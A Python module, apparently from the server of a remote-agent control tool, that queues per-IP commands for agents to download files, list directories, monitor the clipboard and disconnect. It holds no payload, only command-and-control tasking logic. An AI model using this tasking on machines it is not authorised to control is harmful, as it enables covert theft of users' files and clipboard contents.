from pydantic import BaseModel
import uuid

from Utils.Exceptions.NotFoundException import NotFoundException
from Logic.Commands.Commands import Command, Action
from Utils.CommandList import CommandList
import Logic.Agents.AgentsLogic as agentLogic


class DownloadFileTaskInputType(BaseModel):
    ip_address: str
    file_path: str


class ListFilesTaskInputType(BaseModel):
    ip_address: str
    dir_path: str


class MonitorClipboardTaskInputType(BaseModel):
    ip_address: str
    duration: int


class DisconnectAgentTaskInputType(BaseModel):
    ip_address: str


def add_download_file_task(input: DownloadFileTaskInputType) -> uuid:
    agent = agentLogic.get_agent_by_ip_address(input.ip_address)
    if agent is None:
        raise NotFoundException('Agent with given ip address not found')
    list = CommandList()
    command = Command(id=uuid.uuid4(), action=Action.FILE_DOWNLOAD, ip_address=input.ip_address,
                      parameters={"fileName": f'{input.file_path}'})
    list.insert(command)
    return command.id


def add_list_files_task(input: ListFilesTaskInputType) -> uuid:
    agent = agentLogic.get_agent_by_ip_address(input.ip_address)
    if agent is None:
        raise NotFoundException('Agent with given ip address not found')
    list = CommandList()
    command = Command(id=uuid.uuid4(), action=Action.LIST_FILES, ip_address=input.ip_address,
                      parameters={"dir_path": f'{input.dir_path}'})
    list.insert(command)

    return command.id


def add_monitor_clipboard_task(input: MonitorClipboardTaskInputType) -> uuid:
    agent = agentLogic.get_agent_by_ip_address(input.ip_address)
    if agent is None:
        raise NotFoundException('Agent with given ip address not found')
    list = CommandList()
    command = Command(id=uuid.uuid4(), action=Action.CLIPBOARD_MONITOR, ip_address=input.ip_address,
                      parameters={"duration": input.duration})
    list.insert(command)

    return command.id


def add_disconnect_agent_task(input: DisconnectAgentTaskInputType) -> uuid:
    agent = agentLogic.get_agent_by_ip_address(input.ip_address)
    if agent is None:
        raise NotFoundException('Agent with given ip address not found')
    list = CommandList()
    command = Command(id=uuid.uuid4(), action=Action.DISCONNECT, ip_address=input.ip_address, parameters={})
    list.insert(command)

    return command.id


def get_oldest_command_by_ip(ip_address: str) -> Command:
    list = CommandList()
    return list.get_first_by_ip(ip_address)
